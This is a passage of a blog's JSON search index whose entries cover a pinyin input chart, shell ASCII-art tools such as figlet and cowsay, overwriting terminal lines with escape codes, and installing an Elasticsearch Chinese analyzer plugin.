\u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eiu\u003c/td\u003e\n          \u003ctd\u003e六 liu、有 you、謬 miu\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ein\u003c/td\u003e\n          \u003ctd\u003e音 yin、新 xin、林 lin\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eing\u003c/td\u003e\n          \u003ctd\u003e英 ying、靈 ling、醒 xing\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003euan\u003c/td\u003e\n          \u003ctd\u003e元 yuan、卷 juan、團 tuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eue\u003c/td\u003e\n          \u003ctd\u003e略 lue、學 xue\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eyun\u003c/td\u003e\n          \u003ctd\u003e雲 yun、巡 xun、群 qun\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eong\u003c/td\u003e\n          \u003ctd\u003e用 yong、兇 xiong、同 tong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eui\u003c/td\u003e\n          \u003ctd\u003e鬼 gui、為 wei、虧 kui\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eun\u003c/td\u003e\n          \u003ctd\u003e文 wen、混 hun、準 zhun\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eua\u003c/td\u003e\n          \u003ctd\u003e華 hua、抓 zhua、蛙 wa\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003euai\u003c/td\u003e\n          \u003ctd\u003e壞 huai、快 kuai、踹 chuai\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["URL","pinyin"],"title":"一張圖學會【拼音輸入法】"},{"categories":["URL","SHELL","Linux","ASCII"],"contents":" Printing ASCII Art in the Shell banner sudo apt install sysvbanner\n$ banner hello # # ###### # # #### # # # # # # # ###### ##### # # # # # # # # # # # # # # # # # # # # ###### ###### ###### #### FIGlet: Frank, Ian, and Glenn\u0026rsquo;s Letters sudo apt install figlet\n$ figlet hello _ _ _ | |__ ___| | | ___ | \u0026#39;_ \\ / _ \\ | |/ _ \\ | | | | __/ | | (_) | |_| |_|\\___|_|_|\\___/ -f option and specify a font name for the output -l, -c, and -r options to align the text to the left, center, or right, TOIlet: FIGlet With More Options sudo apt install toilet\n$ toilet -f mini hello |_ _ | | _ | | (/_ | | (_) -F filters toilet -F list Available filters: \u0026#34;crop\u0026#34;: crop unused blanks \u0026#34;gay\u0026#34;: add a rainbow colour effect \u0026#34;metal\u0026#34;: add a metallic colour effect \u0026#34;flip\u0026#34;: flip horizontally \u0026#34;flop\u0026#34;: flip vertically \u0026#34;180\u0026#34;: rotate 180 degrees \u0026#34;left\u0026#34;: rotate 90 degrees counterclockwise \u0026#34;right\u0026#34;: rotate 90 degrees clockwise \u0026#34;border\u0026#34;: surround text with a border $ toilet -F border hello ┌───────────────────────────────────┐ │ │ │ # \u0026#34;\u0026#34;# \u0026#34;\u0026#34;# │ │ # mm mmm # # mmm │ │ #\u0026#34; # #\u0026#34; # # # #\u0026#34; \u0026#34;# │ │ # # #\u0026#34;\u0026#34;\u0026#34;\u0026#34; # # # # │ │ # # \u0026#34;#mm\u0026#34; \u0026#34;mm \u0026#34;mm \u0026#34;#m#\u0026#34; │ │ │ │ │ └───────────────────────────────────┘ Making Cows Say Things With cowsay sudo apt install cowsay\ncowsay hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || # `-g`, `-d`, and `-p` for greedy, dead, and paranoid cows cowsay -d hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (xx)\\_______ (__)\\ )\\/\\ U ||----w | || || # use any characters of our choice for the eyes and the tongue by using the `-e` and the `-T` flags cowsay -e oO -T V hello _______ \u0026lt; hello \u0026gt; ------- \\ ^__^ \\ (oO)\\_______ (__)\\ )\\/\\ V ||----w | || || # Using Other Animals and Creatures cowsay -l Cow files in /usr/share/cowsay/cows: apt bud-frogs bunny calvin cheese cock cower daemon default dragon dragon-and-cow duck elephant elephant-in-snake eyes flaming-sheep fox ghostbusters gnu hellokitty kangaroo kiss koala kosh luke-koala mech-and-cow milk moofasa moose pony pony-smaller ren sheep skeleton snowman stegosaurus stimpy suse three-eyes turkey turtle tux unipony unipony-smaller vader vader-koala www cowsay -f duck hello _______ \u0026lt; hello \u0026gt; ------- \\ \\ \\ \u0026gt;()_ (__)__ _ Using cowsay With fortune/lolcat fortune | cowsay ____________________________________ / Try to relax and enjoy the crisis. \\ | | \\ -- Ashleigh Brilliant / ------------------------------------ \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || Printing Images With jp2a sudo apt install jp2a\njp2a baeldung.png d. \u0026#39;kNM; \u0026#39;l0MMMMMo ::ldkKKMMMMMMMMM; :dKNMMMMMMMMMMMKMMMMM. lNMMMMMMMMMMMMMO\u0026#39;MMMMMM xMMMMMMMMMMMMMMd kMMMMMO .MMMMMMMMMMMMMc ;MMMMMM. KMMMMMMMMMMMk ,MMMMMMk NMMMMMMMMMl .KMMMMMMW KMMMMMMW :MMMMMMMM xMMMMM. 0MMMMMMMM. \u0026#39;:dKMMK .dNMMMMMMM. dKKMMMd lKMMMMMMMN .kWMMM0; We can also use the -colors flag to obtain colored output\n","date":"October 21, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221021-shell-printing-ascii-art/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shell-printing-ascii-art\" target=\"_blank\" rel=\"noopener\"\u003ePrinting ASCII Art in the Shell\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"banner\"\u003ebanner\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install sysvbanner\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ banner hello\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  ######  #       #        ####\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e######  #####   #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  #       #       #       #    #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e#    #  ######  ######  ######   ####\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"figlet-frank-ian-and-glenns-letters\"\u003eFIGlet: Frank, Ian, and Glenn\u0026rsquo;s Letters\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install figlet\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ figlet hello\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e _          _ _\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| |__   ___| | | ___\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026#39;\u003c/span\u003e_ \u003cspan style=\"color:#ae81ff\"\u003e\\ \u003c/span\u003e/ _ \u003cspan style=\"color:#ae81ff\"\u003e\\ \u003c/span\u003e| |/ _ \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| | | |  __/ | | \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e_\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|_| |_|\u003cspan style=\"color:#ae81ff\"\u003e\\_\u003c/span\u003e__|_|_|\u003cspan style=\"color:#ae81ff\"\u003e\\_\u003c/span\u003e__/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-f\u003c/code\u003e option and specify a font name for the output\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-l\u003c/code\u003e, \u003ccode\u003e-c\u003c/code\u003e, and \u003ccode\u003e-r\u003c/code\u003e options to align the text to the left, center, or right,\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"toilet-figlet-with-more-options\"\u003eTOIlet: FIGlet With More Options\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt install toilet\u003c/code\u003e\u003c/p\u003e","tags":["URL","SHELL","Linux","ASCII"],"title":"Printing ASCII Art in the Shell"},{"categories":["URL","SHELL","Linux"],"contents":" How to Make Output Overwrite the Same Line in a Terminal Introduction to the Problem $ cat print_status.sh !/bin/bash echo \u0026#34;[INFO] Processing file: readme.txt\u0026#34; sleep 2 To simulate the file processing echo \u0026#34;[INFO] Processing file: veryPowerfulService.service\u0026#34; sleep 2 echo \u0026#34;[INFO] Processing file: log.txt\u0026#34; echo \u0026#34;DONE\u0026#34; $ ./print_status.sh [INFO] Processing file: readme.txt [INFO] Processing file: veryPowerfulService.service [INFO] Processing file: log.txt DONE The \u0026ldquo;Magic Code\u0026rdquo;: \\033[0K\\r -n option asks the echo command to stop outputting the trailing newline character -e option allows the echo command to interpret backslash escapes such as \\n (newline) and \\r (carriage return) \\033 - It\u0026rsquo;s the escape sequence. In other words, it\u0026rsquo;s ESC. \\033[ - Then this becomes \u0026ldquo;ESC [\u0026rdquo;, which is the control sequence introducer (CSI). \\033[0k - So it\u0026rsquo;s \u0026ldquo;CSI 0 K\u0026rdquo;. Further, \u0026ldquo;CSI 0 K\u0026rdquo; erases the text from the cursor to the end of the line. \\r - This is the carriage return. It brings the cursor to the beginning of the line. $ cat print_status.sh #!/bin/bash echo -ne \u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34; sleep 2 echo -ne \u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34; sleep 2 echo -e \u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\u0026#34; echo \u0026#34;DONE\u0026#34; !/bin/bash printf \u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34; sleep 2 printf \u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34; sleep 2 printf \u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\\n\u0026#34; echo \u0026#34;DONE\u0026#34; ","date":"October 21, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221021-echo-printf-overwrite-terminal-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/echo-printf-overwrite-terminal-line\" target=\"_blank\" rel=\"noopener\"\u003eHow to Make Output Overwrite the Same Line in a Terminal\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"introduction-to-the-problem\"\u003eIntroduction to the Problem\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e  To simulate the file processing\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: readme.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: veryPowerfulService.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eINFO\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Processing file: log.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDONE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"the-magic-code-0330kr\"\u003eThe \u0026ldquo;Magic Code\u0026rdquo;: \u003ccode\u003e\\033[0K\\r\u003c/code\u003e\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-n\u003c/code\u003e option asks the echo command to stop outputting the trailing newline character\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-e\u003c/code\u003e option allows the echo command to interpret backslash escapes such as \u003ccode\u003e\\n\u003c/code\u003e (newline) and \u003ccode\u003e\\r\u003c/code\u003e (carriage return)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033\u003c/code\u003e - It\u0026rsquo;s the escape sequence. In other words, it\u0026rsquo;s ESC.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033[\u003c/code\u003e - Then this becomes \u0026ldquo;ESC [\u0026rdquo;, which is the control sequence introducer (CSI).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\033[0k\u003c/code\u003e - So it\u0026rsquo;s \u0026ldquo;CSI 0 K\u0026rdquo;. Further, \u0026ldquo;CSI 0 K\u0026rdquo; erases the text from the cursor to the end of the line.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\r\u003c/code\u003e - This is the carriage return. It brings the cursor to the beginning of the line.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat print_status.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -ne \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -ne \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: readme.txt\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: veryPowerfulService.service\\033[0K\\r\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esleep \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintf \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[INFO] Processing file: log.txt\\033[0K\\r\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","SHELL","Linux"],"title":"How to Make Output Overwrite the Same Line in a Terminal"},{"categories":["URL","Docker","ELK","ElasticSearch","Kibana"],"contents":" ElasticSearch 学习笔记 安装中文分词插件 docker exec -it elasticsearch bash $ elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v8.4.1/elasticsearch-analysis-ik-8.4.1.zip Dev Tools content 类型为 text，写入时使用 ik_max_word 做分词，搜索时使用 ik_smart 分词。这两个的区别在于，前者产生尽可能多的分词，后者产生粗粒度的分词。 PUT /words { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;content\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34;, \u0026#34;search_analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; }, \u0026#34;age\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;integer\u0026#34;, \u0026#34;index\u0026#34;: false } } } } { \u0026#34;acknowledged\u0026#34;: true, \u0026#34;shards_acknowledged\u0026#34;: true, \u0026#34;index\u0026#34;: \u0026#34;words\u0026#34; } ","date":"October 6, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221006-elasticsearch/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jiajunhuang.com/articles/2022_10_06-elasticsearch.md.html\" target=\"_blank\" rel=\"noopener\"\u003eElasticSearch 学习笔记\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"安装中文分词插件\"\u003e安装中文分词插件\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker exec -it elasticsearch bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v8.4.1/elasticsearch-analysis-ik-8.4.1.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eDev Tools\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003econtent\u003c/code\u003e 类型为 \u003ccode\u003etext\u003c/code\u003e，写入时使用 \u003ccode\u003eik_max_word\u003c/code\u003e 做分词，搜索时使用 \u003ccode\u003eik_smart\u003c/code\u003e 分词。这两个的区别在于，前者产生尽可能多的分词，后者产生粗粒度的分词。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003ePUT\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e/words\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e\u0026#34;mappings\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;properties\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;analyzer\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ik_max_word\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;search_analyzer\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ik_smart\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\u0026#34;age\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;integer\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;acknowledged\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;shards_acknowledged\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;index\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;words\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Docker","ELK","ElasticSearch","Kibana"],"title":"ElasticSearch 